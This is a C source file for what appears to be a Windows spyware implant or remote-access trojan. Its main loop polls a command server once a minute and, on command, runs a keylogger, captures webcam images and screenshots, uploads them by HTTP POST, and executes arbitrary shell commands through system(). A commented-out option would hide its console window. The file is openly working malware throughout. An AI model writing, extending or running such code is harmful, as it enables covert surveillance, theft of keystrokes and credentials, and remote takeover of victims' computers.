#include "Capture/webcam.h"
#include "Capture/screenshot.h"
#include "KeyLogger/logger.h"
#include "HTTP/http.h"
#include "constants.h"
#include <stdio.h>
#include <process.h>
#include <string.h>
#pragma warning(disable:4996)
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "msvcrt.lib")
//#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) // Hide console

HANDLE key_log_thread = { 0 };
BOOL key_log_running = FALSE;
extern HHOOK hhk_low_level_hook;
extern HANDLE logger_file_handle;

int execute_commands(char commands[MAX_COMMANDS][MAX_COMMAND_LEN]) {
	int i = 0;
	unsigned int thread_id = 0;
	DWORD exit_code = 0;
	BOOL return_value = 0;
	char* bmp_capture = NULL;
	char* file_data = NULL;
	int result = 0;
	DWORD bytes_read = 0;

	while (strnlen(commands[i], MAX_COMMAND_LEN) && i < MAX_COMMANDS) {
		if (strncmp(commands[i], START_KEYLOGGING, sizeof(START_KEYLOGGING) - 1) == 0
			&& !key_log_running) {
			key_log_thread = (HANDLE)_beginthreadex(NULL, STACK_SIZE,
				&start_logging, NULL, 0, &thread_id);
			key_log_running = TRUE;
		}
		else if (strncmp(commands[i], SEND_KEYLOGGING, sizeof(SEND_KEYLOGGING) - 1) == 0) {
			file_data = (char*)malloc(MAX_FILE_READ);
			read_file(file_data, &bytes_read, MAX_FILE_READ);
			send_post_request_without_listening(file_data, bytes_read, KEYLOG_URI,
				TEXT_MIME);
			free(file_data);

		}
		else if (strncmp(commands[i], STOP_KEYLOGGING, sizeof(STOP_KEYLOGGING) - 1) == 0
			&& key_log_running) {
			UnhookWindowsHookEx(hhk_low_level_hook);
			CloseHandle(logger_file_handle);
			GetExitCodeThread(key_log_thread, &exit_code);
			return_value = TerminateThread(key_log_thread, exit_code);
			if (return_value == 0) {
				printf("Closing key logging thread failed with error: %d", GetLastError());
				i++;
				continue;
			}
			key_log_running = FALSE;
			printf("stopped keylogging\n");
		}
		else if (strncmp(commands[i], WEBCAM_CAPTURE, sizeof(WEBCAM_CAPTURE) - 1) == 0) {
			bmp_capture = (char*)malloc(get_webcam_capture_size() * sizeof(char));
			result = take_web_capture(&bmp_capture);
			if (result == 0)
				printf("Webcam is either not present or in use\n");
			else
				send_post_request_without_listening(bmp_capture, get_webcam_capture_size(),
					WEBCAM_URI, BMP_MIME);
			free(bmp_capture);
		}
		else if (strncmp(commands[i], SCREENSHOT, sizeof(SCREENSHOT) - 1) == 0) {
			bmp_capture = take_screen_capture();
			send_post_request_without_listening(bmp_capture, get_screen_capture_size(),
				SCREENSHOT_URI, BMP_MIME);
			free(bmp_capture);
		}
		else if (strncmp(commands[i], EXECUTE, sizeof(EXECUTE) - 1) == 0)
			system(commands[i] + sizeof(EXECUTE));
		else if (strncmp(commands[i], STOP_EXECUTION, sizeof(STOP_EXECUTION) - 1) == 0)
			return 0;
		else if (strncmp(commands[i], NO_COMMANDS, sizeof(NO_COMMANDS) - 1) == 0)
			return 1;
		else
			printf("Invalid command: %s\n", commands[i]);
		i++;
	}
	return 1;
}

int main() {
	COMMANDS_HTTP_RESPONSE http_response = send_get_command("first_command");
	while (1) {
		if (!execute_commands(http_response.commands))
			break;
		Sleep(ONE_MIN);
		http_response = send_get_command("command");
	}
	return 1;
}